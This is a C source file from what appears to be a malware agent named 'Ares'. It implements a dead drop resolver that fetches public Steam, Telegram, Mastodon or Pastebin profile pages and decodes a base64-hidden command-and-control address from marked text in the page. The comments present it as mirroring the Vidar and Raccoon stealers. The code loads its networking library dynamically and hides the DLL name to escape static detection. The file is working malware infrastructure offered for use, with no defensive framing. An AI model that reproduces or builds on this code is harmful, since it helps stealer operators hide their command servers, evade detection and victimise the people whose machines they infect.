/* Dead Drop Resolver — extract C2 IP from public profile pages
 *
 * Technique: Agent reads a public social media profile (Steam, Telegram,
 * Mastodon, Pastebin) looking for a hidden marker in the page HTML.
 *
 * Marker format in profile bio: {{BASE64_ENCODED_C2_URL}}
 * Example: Steam profile bio contains "Player since {{aHR0cHM6Ly9jMi55b3VyZG9tYWluLnh5eg==}}."
 * Agent decodes base64 between {{ and }} to get real C2 URL.
 *
 * This mirrors the dead drop resolver used by Vidar, Raccoon, and other
 * commodity stealers that abuse Telegram/Steam/Mastodon profiles.
 */

#include "ares_agent.h"
#include "ares_config.h"
#include <string.h>
/* WinHTTP loaded dynamically - avoids static import detection */
typedef LPVOID HINTERNET;
#define WINHTTP_ACCESS_TYPE_DEFAULT_PROXY 0
#define WINHTTP_FLAG_SECURE               0x00800000
#define WINHTTP_ADDREQ_FLAG_ADD           0x20000000
#define WINHTTP_NO_REFERER                NULL
#define WINHTTP_DEFAULT_ACCEPT_TYPES      NULL
#define WINHTTP_NO_ADDITIONAL_HEADERS     NULL
#define WINHTTP_OPTION_CONNECT_TIMEOUT    3
#define WINHTTP_OPTION_SEND_TIMEOUT       5
#define WINHTTP_OPTION_RECEIVE_TIMEOUT    6
typedef WORD INTERNET_PORT;

typedef HINTERNET (WINAPI *pfn_WinHttpOpen)(LPCWSTR,DWORD,LPCWSTR,LPCWSTR,DWORD);
typedef HINTERNET (WINAPI *pfn_WinHttpConnect)(HINTERNET,LPCWSTR,WORD,DWORD);
typedef HINTERNET (WINAPI *pfn_WinHttpOpenRequest)(HINTERNET,LPCWSTR,LPCWSTR,LPCWSTR,LPCWSTR,LPCWSTR*,DWORD);
typedef BOOL (WINAPI *pfn_WinHttpAddRequestHeaders)(HINTERNET,LPCWSTR,DWORD,DWORD);
typedef BOOL (WINAPI *pfn_WinHttpSendRequest)(HINTERNET,LPCWSTR,DWORD,LPVOID,DWORD,DWORD,DWORD_PTR);
typedef BOOL (WINAPI *pfn_WinHttpReceiveResponse)(HINTERNET,LPVOID);
typedef BOOL (WINAPI *pfn_WinHttpQueryDataAvailable)(HINTERNET,LPDWORD);
typedef BOOL (WINAPI *pfn_WinHttpReadData)(HINTERNET,LPVOID,DWORD,LPDWORD);
typedef BOOL (WINAPI *pfn_WinHttpSetOption)(HINTERNET,DWORD,LPVOID,DWORD);
typedef BOOL (WINAPI *pfn_WinHttpCloseHandle)(HINTERNET);

static pfn_WinHttpOpen              _ddWinHttpOpen;
static pfn_WinHttpConnect           _ddWinHttpConnect;
static pfn_WinHttpOpenRequest       _ddWinHttpOpenRequest;
static pfn_WinHttpAddRequestHeaders _ddWinHttpAddRequestHeaders;
static pfn_WinHttpSendRequest       _ddWinHttpSendRequest;
static pfn_WinHttpReceiveResponse   _ddWinHttpReceiveResponse;
static pfn_WinHttpQueryDataAvailable _ddWinHttpQueryDataAvailable;
static pfn_WinHttpReadData          _ddWinHttpReadData;
static pfn_WinHttpSetOption         _ddWinHttpSetOption;
static pfn_WinHttpCloseHandle       _ddWinHttpCloseHandle;

static BOOL _dd_load_winhttp(void) {
    static BOOL loaded = FALSE;
    if (loaded) return TRUE;
    /* Char array avoids "winhttp.dll" string literal in binary */
    char name[] = {'w','i','n','h','t','t','p','.','d','l','l',0};
    HMODULE h = LoadLibraryA(name);
    if (!h) return FALSE;
    _ddWinHttpOpen              = (pfn_WinHttpOpen)GetProcAddress(h, "WinHttpOpen");
    _ddWinHttpConnect           = (pfn_WinHttpConnect)GetProcAddress(h, "WinHttpConnect");
    _ddWinHttpOpenRequest       = (pfn_WinHttpOpenRequest)GetProcAddress(h, "WinHttpOpenRequest");
    _ddWinHttpAddRequestHeaders = (pfn_WinHttpAddRequestHeaders)GetProcAddress(h, "WinHttpAddRequestHeaders");
    _ddWinHttpSendRequest       = (pfn_WinHttpSendRequest)GetProcAddress(h, "WinHttpSendRequest");
    _ddWinHttpReceiveResponse   = (pfn_WinHttpReceiveResponse)GetProcAddress(h, "WinHttpReceiveResponse");
    _ddWinHttpQueryDataAvailable= (pfn_WinHttpQueryDataAvailable)GetProcAddress(h, "WinHttpQueryDataAvailable");
    _ddWinHttpReadData          = (pfn_WinHttpReadData)GetProcAddress(h, "WinHttpReadData");
    _ddWinHttpSetOption         = (pfn_WinHttpSetOption)GetProcAddress(h, "WinHttpSetOption");
    _ddWinHttpCloseHandle       = (pfn_WinHttpCloseHandle)GetProcAddress(h, "WinHttpCloseHandle");
    loaded = (_ddWinHttpOpen != NULL);
    return loaded;
}

/* ── Internal helpers ── */

static BOOL _extract_between_markers(const char* html, const char* start_marker,
    const char* end_marker, char* out, int out_len)
{
    if (!html || !start_marker || !end_marker || !out || out_len <= 0)
        return FALSE;

    const char* s = strstr(html, start_marker);
    if (!s) return FALSE;
    s += strlen(start_marker);

    const char* e = strstr(s, end_marker);
    if (!e) return FALSE;

    int len = (int)(e - s);
    if (len <= 0 || len >= out_len)
        return FALSE;

    memcpy(out, s, len);
    out[len] = '\0';
    return TRUE;
}

static BYTE _dd_b64val(char c) {
    if (c >= 'A' && c <= 'Z') return (BYTE)(c - 'A');
    if (c >= 'a' && c <= 'z') return (BYTE)(c - 'a' + 26);
    if (c >= '0' && c <= '9') return (BYTE)(c - '0' + 52);
    if (c == '+') return 62;
    if (c == '/') return 63;
    return 0xFF;
}

static int _base64_decode(const char* in, int in_len, BYTE* out, int out_max) {
    int i, j = 0;
    for (i = 0; i < in_len && j < out_max; i += 4) {
        BYTE a = _dd_b64val(in[i]);
        BYTE b = (i+1 < in_len) ? _dd_b64val(in[i+1]) : 0;
        BYTE c = (i+2 < in_len) ? _dd_b64val(in[i+2]) : 0;
        BYTE d = (i+3 < in_len) ? _dd_b64val(in[i+3]) : 0;
        if (a == 0xFF) break;
        if (j < out_max) out[j++] = (a << 2) | (b >> 4);
        if (j < out_max && in[i+2] != '=') out[j++] = (b << 4) | (c >> 2);
        if (j < out_max && in[i+3] != '=') out[j++] = (c << 6) | d;
    }
    return j;
}

/* ── Parse "host:port" or "https://host:port/..." from decoded string ── */

static BOOL _parse_host_port(const char* decoded, char* host_out, int host_max, int* port_out) {
    const char* p = decoded;

    /* Skip protocol prefix if present */
    if (strncmp(p, "https://", 8) == 0) {
        p += 8;
        *port_out = 443;
    } else if (strncmp(p, "http://", 7) == 0) {
        p += 7;
        *port_out = 80;
    }

    /* Copy host, stop at : / or end */
    int i = 0;
    while (*p && *p != ':' && *p != '/' && i < host_max - 1) {
        host_out[i++] = *p++;
    }
    host_out[i] = '\0';

    /* Parse port if present */
    if (*p == ':') {
        p++;
        int port = 0;
        while (*p >= '0' && *p <= '9') {
            port = port * 10 + (*p - '0');
            p++;
        }
        if (port > 0 && port <= 65535)
            *port_out = port;
    }

    return (i > 0);
}

/* ── HTTP GET a public page via WinHTTP ── */

static BOOL _dd_http_get(const wchar_t* host, int port, const wchar_t* path,
    BOOL use_https, char* response, int resp_max)
{
    if (!_dd_load_winhttp()) return FALSE;
    HINTERNET hSession = _ddWinHttpOpen(
        L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) return FALSE;

    /* 10 second timeout per URL */
    DWORD timeout = 10000;
    _ddWinHttpSetOption(hSession, WINHTTP_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));
    _ddWinHttpSetOption(hSession, WINHTTP_OPTION_SEND_TIMEOUT, &timeout, sizeof(timeout));
    _ddWinHttpSetOption(hSession, WINHTTP_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));

    HINTERNET hConnect = _ddWinHttpConnect(hSession, host, (INTERNET_PORT)(WORD)port, 0);
    if (!hConnect) {
        _ddWinHttpCloseHandle(hSession);
        return FALSE;
    }

    HINTERNET hRequest = _ddWinHttpOpenRequest(hConnect, L"GET", path,
        NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
        use_https ? WINHTTP_FLAG_SECURE : 0);
    if (!hRequest) {
        _ddWinHttpCloseHandle(hConnect);
        _ddWinHttpCloseHandle(hSession);
        return FALSE;
    }

    /* Accept any content */
    _ddWinHttpAddRequestHeaders(hRequest,
        L"Accept: text/html,application/xhtml+xml,*/*", -1,
        WINHTTP_ADDREQ_FLAG_ADD);

    BOOL sent = _ddWinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS,
        0, NULL, 0, 0, 0);
    if (!sent || !_ddWinHttpReceiveResponse(hRequest, NULL)) {
        _ddWinHttpCloseHandle(hRequest);
        _ddWinHttpCloseHandle(hConnect);
        _ddWinHttpCloseHandle(hSession);
        return FALSE;
    }

    /* Read response body */
    DWORD total = 0, avail, rd;
    while (_ddWinHttpQueryDataAvailable(hRequest, &avail) && avail > 0) {
        if ((int)(total + avail) >= resp_max - 1) break;
        _ddWinHttpReadData(hRequest, response + total, avail, &rd);
        total += rd;
    }
    response[total] = '\0';

    _ddWinHttpCloseHandle(hRequest);
    _ddWinHttpCloseHandle(hConnect);
    _ddWinHttpCloseHandle(hSession);
    return (total > 0);
}

/* ── Parse URL into host/port/path components ── */

static BOOL _parse_url(const char* url, wchar_t* host_out, int host_max,
    wchar_t* path_out, int path_max, int* port_out, BOOL* https_out)
{
    const char* p = url;
    *https_out = TRUE;
    *port_out = 443;

    if (strncmp(p, "https://", 8) == 0) {
        p += 8;
        *https_out = TRUE;
        *port_out = 443;
    } else if (strncmp(p, "http://", 7) == 0) {
        p += 7;
        *https_out = FALSE;
        *port_out = 80;
    }

    /* Extract host */
    char host_a[256] = {0};
    int i = 0;
    while (*p && *p != ':' && *p != '/' && i < 255)
        host_a[i++] = *p++;
    host_a[i] = '\0';

    /* Port override */
    if (*p == ':') {
        p++;
        int port = 0;
        while (*p >= '0' && *p <= '9') {
            port = port * 10 + (*p - '0');
            p++;
        }
        if (port > 0 && port <= 65535)
            *port_out = port;
    }

    /* Path (rest of URL, default to /) */
    char path_a[512] = "/";
    if (*p == '/') {
        strncpy(path_a, p, 511);
        path_a[511] = '\0';
    }

    MultiByteToWideChar(CP_UTF8, 0, host_a, -1, host_out, host_max);
    MultiByteToWideChar(CP_UTF8, 0, path_a, -1, path_out, path_max);
    return (i > 0);
}

/* ═══════════════════════════════════════════════════════════════
 *  DeadDrop_Resolve — Try each dead drop URL in order
 *
 *  For each URL:
 *    1. HTTP GET the public page
 *    2. Search HTML for {{ ... }} markers
 *    3. Base64 decode content between markers
 *    4. Parse decoded content as C2 host[:port]
 *    5. Return TRUE on first success
 * ═══════════════════════════════════════════════════════════════ */

BOOL DeadDrop_Resolve(const char** urls, int url_count, char* c2_host_out, int* c2_port_out) {
    if (!urls || url_count <= 0 || !c2_host_out || !c2_port_out)
        return FALSE;

    for (int i = 0; i < url_count; i++) {
        if (!urls[i] || !urls[i][0])
            continue;

        /* Parse dead drop URL */
        wchar_t dd_host[256] = {0};
        wchar_t dd_path[512] = {0};
        int dd_port = 443;
        BOOL dd_https = TRUE;

        if (!_parse_url(urls[i], dd_host, 256, dd_path, 512, &dd_port, &dd_https))
            continue;

        /* Fetch page HTML (max 256KB — profile pages are small) */
        int buf_size = 256 * 1024;
        char* html = (char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, buf_size);
        if (!html) continue;

        BOOL got = _dd_http_get(dd_host, dd_port, dd_path, dd_https, html, buf_size);
        if (!got) {
            HeapFree(GetProcessHeap(), 0, html);
            continue;
        }

        /* Search for marker pattern */
        char encoded[1024] = {0};
        BOOL found = _extract_between_markers(html,
            CFG_DEAD_DROP_MARKER_START, CFG_DEAD_DROP_MARKER_END,
            encoded, sizeof(encoded));

        HeapFree(GetProcessHeap(), 0, html);

        if (!found || !encoded[0])
            continue;

        /* Base64 decode */
        BYTE decoded[512] = {0};
        int dec_len = _base64_decode(encoded, (int)strlen(encoded), decoded, sizeof(decoded) - 1);
        if (dec_len <= 0)
            continue;
        decoded[dec_len] = '\0';

        /* Parse host:port from decoded C2 URL */
        if (_parse_host_port((const char*)decoded, c2_host_out, 256, c2_port_out))
            return TRUE;
    }

    return FALSE;
}

